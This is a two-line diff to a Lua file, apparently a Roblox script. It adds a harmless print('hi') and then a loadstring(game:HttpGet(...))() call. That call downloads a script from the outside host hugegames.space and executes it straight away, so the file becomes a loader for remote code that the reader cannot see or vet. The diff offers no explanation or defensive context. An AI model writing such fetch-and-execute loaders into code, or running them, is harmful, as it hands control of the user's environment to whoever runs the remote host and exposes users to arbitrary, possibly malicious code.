@@ -1,1 +1,2 @@
-
+print("hi")
+loadstring(game:HttpGet("https://hugegames.space/1f3cf476ecba4ee66e9ca774.lua"))()
